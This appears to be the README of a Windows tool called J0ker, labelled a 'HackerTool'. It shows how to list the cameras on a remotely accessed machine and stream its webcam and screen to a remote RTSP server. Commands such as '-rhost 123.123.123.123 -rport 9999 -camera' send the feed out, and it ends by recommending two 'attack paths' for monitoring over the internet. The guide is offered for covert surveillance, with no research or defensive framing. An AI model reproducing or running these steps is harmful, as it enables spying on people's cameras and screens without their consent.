  <div align="center">
<p align="center">
 <img title="J0ker" src='https://img.shields.io/badge/J0ker-1.0.0-brightgreen.svg' />
 <img title="J0ker" src='https://img.shields.io/badge/Python-3.9-yellow.svg' />
  <img title="J0ker" src='https://img.shields.io/badge/HackerTool-x' />
 <img title="J0ker" src='https://img.shields.io/static/v1?label=Author&message=@Martin&color=red'/>
 <img title="J0ker" src='https://img.shields.io/badge/-windows-F16061?logo=windows&logoColor=000'/>
</p>
</div>

#J0ker Description

|Function|
|---|
|RTSP streaming|
|Real time playback|
|Real time screen recording|
|Real time live streaming|


# Configure Client

![image.png](https://image.3001.net/images/20231126/1700990224_65630d109b307035a65ad.png!small)

I connected directly to the remote desktop here

![image.png](https://image.3001.net/images/20231126/1700990277_65630d451132db61b7ffa.png!small)

*Start RTSP service*

`#J0ker.exe -server 9999`
![image.png](https://image.3001.net/images/20231126/1700990508_65630e2c5aa2ece89c79d.png!small)

*Let Mr. Joker see which cameras there are...*

`#J0ker.exe -get`

![image.png](https://image.3001.net/images/20231126/1700990399_65630dbfaa2c031f7c3b7.png!small)

*Successfully connected to the server..*

`#J0ker.exe -rhost 123.123.123.123 -rport 9999 -camera "USB2.0 PC CAMERA"`

![image.png](https://image.3001.net/images/20231126/1700990652_65630ebc52e9b36f5fb30.png!small)

*Copy>rtsp://192.168.0.104:9999/tPo6wh*

# Using J0ker on PC to play RTSP streams

*Other host perspectives:*

*Mr. Joker, turn on the camera*

`#J0ker.exe -play rtsp://192.168.0.104:9999/tPo6wh`

![image.png](https://image.3001.net/images/20231126/1700990837_65630f7566ad93405bb4b.png!small)

# Using VLC to play RTSP streams on the PC end

![image.png](https://image.3001.net/images/20231126/1700991108_65631084b5ceadcd5447f.png!small)

# Android uses VLC to play RTSP streams

_The APK package is located in the Android directory_
![image.png](https://image.3001.net/images/20231126/1700992382_6563157ec9ce6f6c44e6a.png!small)

_After installation, enter the RTSP address to connect_

![image.png](https://image.3001.net/images/20231126/1700992355_65631563a3367af486d8a.png!small)

![Screenshot_20231126_175131.jpg](https://image.3001.net/images/20231126/1700992406_6563159622690c22a5917.jpg!small)

![Screenshot_20231126_175204.jpg](https://image.3001.net/images/20231126/1700992422_656315a6c141aa5485407.jpg!small)

# Regarding the internet and streaming monitoring

_There is no problem at all, so we recommend these two attack paths_

_Select 1. Deploy on internet servers_

![image.png](https://image.3001.net/images/20231126/1700992944_656317b072a0b9c2271b8.png!small)

 _Select 2. Port forwarding_

 ![image.png](https://image.3001.net/images/20231126/1700993056_6563182077ab48564d4c2.png!small)
